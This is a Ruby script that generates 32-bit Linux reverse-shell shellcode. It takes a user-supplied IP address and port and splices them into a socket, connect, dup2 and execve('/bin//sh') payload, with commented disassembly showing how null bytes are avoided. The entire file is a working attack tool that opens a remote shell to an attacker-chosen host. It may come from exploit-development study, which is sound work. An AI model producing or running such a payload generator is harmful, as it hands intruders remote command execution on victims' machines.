#!/usr/bin/ruby
require 'resolv'

SHELLCODE_PART1="\\x6a\\x66\\x58\\x6a\\x01\\x5b\\x31\\xd2\\x52\\x6a\\x01\\x6a\\x02\\x89\\xe1\\xcd\\x80\\x89\\xc6\\x6a\\x02\\x59\\x52\\xe2\\xfd"

#\x68\x7f\x00\x00\x01 	push   0x100007f
#\x66\x68\x20\xfb 	pushw  0xfb20

SHELLCODE_PART2="\\x66\\x6a\\x02\\x89\\xe1\\x6a\\x10\\x51\\x56\\x89\\xe1\\x6a\\x66\\x58\\x83\\xc3\\x02\\xcd\\x80\\x6a\\x3f\\x58\\x89\\xf3\\x31\\xc9\\xcd\\x80\\x6a\\x3f\\x58\\x41\\xcd\\x80\\x6a\\x3f\\x58\\x41\\xcd\\x80\\x6a\\x0b\\x58\\x31\\xc9\\x89\\xca\\x52\\x68\\x6e\\x2f\\x73\\x68\\x68\\x2f\\x2f\\x62\\x69\\x89\\xe3\\xcd\\x80"


#########ip##########
#if there's no zero byte:
#\x68\x7f\x00\x00\x01   push   0x100007f
#as stack only allow to push word/dword not byte, I need to handle the IP address by two times.
#then it goes to the same condition with port handling. 
##0x0000:
# 8048060:	31 d2                	xor    edx,edx
# 8048062:	66 52                	push   dx
##0x0001-0x00ff
# 8048060:      66 68 ff 01             pushw  0x1ff
# 8048064:      66 5a                   pop    dx
# 8048065:      80 ee 01             	sub    dh,0x1
# 8048069:      66 52                   push   dx
# 804806a:      31 d2                   xor    edx,edx

##0x0100-0xff00
# 8048060:      66 68 01 ff             pushw  0xff01
# 8048064:      66 5a                   pop    dx
# 8048065:      83 ea 01                sub    edx,0x1
# 8048068:      66 52                   push   dx
# 8048069:      31 d2                   xor    edx,edx


#######port##########
#if there's no zero byte:
#\x66\x68\x20\xfb       pushw  0xfb20
#if there's zero byte:
##0x0000: reject
##0x0001-0x00FF=>0x0101-0x01ff, sub 0x0100
# 8048060:	66 68 ff 01          	pushw  0x1ff
# 8048064:	66 5a                  	pop    dx
# 8048065:	80 ee 01          	sub    dh,0x1
# 8048069:	66 52                  	push   dx
# 804806a:	31 d2                	xor    edx,edx

##0x0100-0xFF00=>0x0101-0xff01, sub 0x0001
# 8048060:	66 68 01 ff          	pushw  0xff01
# 8048064:	66 5a                  	pop    dx
# 8048065:	83 ea 01             	sub    edx,0x1
# 8048068:	66 52                  	push   dx
# 8048069:	31 d2                	xor    edx,edx


part_port=""
part_ip=""


print "Input the IP for reverse shell:\n"
sip=gets.chomp
case sip
when Resolv::IPv4::Regex
  puts "It's a valid IPv4 address. Continue."
else
  puts "It's not a valid IP address."
  exit(1)
end

print "Input the port for reverseshell:\n"
sport=gets.chomp
if !/\A\d+\z/.match(sport) then
    print "not a good number\n"
    exit(1)
elsif sport.to_i <1 || sport.to_i >65535
    print "not a legal number\n"
    exit(1)
end


#processing IP
asip=sip.split(".")
haszero=0
asip.each do |aByte|
    if aByte.to_i==0 then
        haszero+=1
    end
end

hip=Array.new(2)

if haszero==0 then
    print "Non-zero IP, preceeding normally.\n"
    part_ip="\\x68"
    asip.reverse_each do |aByte|
       part_ip=part_ip+"\\x"+ ("%02x"% aByte.to_i)
    end
else
    print "Contains zero IP, zero number: "+haszero.to_s+"\n"
    ip_b=("%02x"%asip[3].to_i)+("%02x"%asip[2].to_i)
    ip_a=("%02x"%asip[1].to_i)+("%02x"%asip[0].to_i)
    hip[0]=ip_b
    hip[1]=ip_a

    hip.each do |wordIP|
        print "processing: "+wordIP+"\n"
        if wordIP=~/0000/ then
# 8048060:      31 d2                   xor    edx,edx
# 8048062:      66 52                   push   dx
            print "proceding to avoid a word zero\n"             
            part_ip=part_ip+"\\x31\\xd2\\x66\\x52"
        elsif wordIP=~/[0-9a-f][0-9a-f]00/ then
            print "proceding to avoid lower zero in IP\n"
            iwordIP=wordIP.to_i(16)
            iwordIP=iwordIP+1
            liwordIP="%02x" % (iwordIP & 0x00FF)
            hiwordIP="%02x" % ((iwordIP & 0xFF00)>>8)
            part_ip=part_ip+"\\x66\\x68"+"\\x"+liwordIP+"\\x"+hiwordIP+"\\x66\\x5a\\x83\\xea\\x01\\x66\\x52\\x31\\xd2"
        elsif wordIP=~/00[0-9a-f][0-9a-f]/ then
            print "proceding to avoid higher zero in IP\n"
            iwordIP=wordIP.to_i(16)
            iwordIP=iwordIP+0x0100
            liwordIP="%02x" % (iwordIP & 0x00FF)
            hiwordIP="%02x" % ((iwordIP & 0xFF00)>>8)
            part_ip=part_ip+"\\x66\\x68"+"\\x"+liwordIP+"\\x"+hiwordIP+"\\x66\\x5a\\x80\\xee\\x01\\x66\\x52\\x31\\xd2"
        else
            print "proceding normal IP\n"
            liwordIP="%02x" % (wordIP.to_i(16) & 0x00FF)
            hiwordIP="%02x" % ((wordIP.to_i(16) & 0xFF00)>>8)
            part_ip=part_ip+"\\x66\\x68"+"\\x"+liwordIP+"\\x"+hiwordIP
        end
    end
end

port=sport.to_i
hport="%04x" % port

if hport=~/[0-9a-f][0-9a-f]00/ then
    print "proceding to avoid lower zero\n"
    wport=port+1
    #lower byte
    lwport="%02x" % (wport & 0x00FF)
    #higher byte
    hwport="%02x" % ((wport & 0xFF00)>>8)
    part_port="\\x66\\x68"+"\\x"+hwport+"\\x"+lwport+"\\x66\\x5a\\x83\\xea\\x01\\x66\\x52\\x31\\xd2"
elsif port<=255
    print "proceding to avoid higher zero\n"
    wport=port+0x0100
    #lower byte
    lwport="%02x" % (wport & 0x00FF)
    #higher byte
    hwport="%02x" % ((wport & 0xFF00)>>8)
    part_port="\\x66\\x68"+"\\x"+hwport+"\\x"+lwport+"\\x66\\x5a\\x80\\xee\\x01\\x66\\x52\\x31\\xd2"
else
    print "proceding normal\n"
    #lower byte
    lwport="%02x" % (port & 0x00FF)
    #higher byte
    hwport="%02x" % ((port & 0xFF00)>>8)
    part_port="\\x66\\x68"+"\\x"+hwport+"\\x"+lwport
end

print SHELLCODE_PART1+part_ip+part_port+SHELLCODE_PART2+"\n"

